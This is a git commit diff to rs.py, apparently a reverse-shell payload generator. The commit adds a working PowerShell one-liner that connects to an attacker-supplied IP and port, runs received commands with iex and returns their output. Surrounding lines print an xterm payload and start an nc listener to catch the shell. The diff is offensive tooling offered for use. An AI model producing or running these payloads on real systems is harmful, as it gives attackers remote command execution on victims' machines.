ac57abf32daf2bebc68fdc2c991fa0e7024c53a1
ihebski <iheb.ibs@gmail.com>
2019-01-20 18:50:10 +0100

    powershell

--- rs.py
+++ rs.py
@@ -49,6 +49,10 @@ def main(ip,port):
 	
 	print(Fore.BLUE + '\n [+] xTerm Payload\n')
 	print Fore.WHITE+""" xterm -display {0}:1 """.format(ip)
+	
+	print(Fore.BLUE + '\n [+] Powershell Payload\n')
+	print Fore.WHITE+""" $client = New-Object System.Net.Sockets.TCPClient("{0}",{1})""".format(ip,port) +""";$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
+
 	print "\n"
 	print "\033[32m[+] Incoming shell *-*"
 	cmd = "nc -lnvp {0}".format(port)
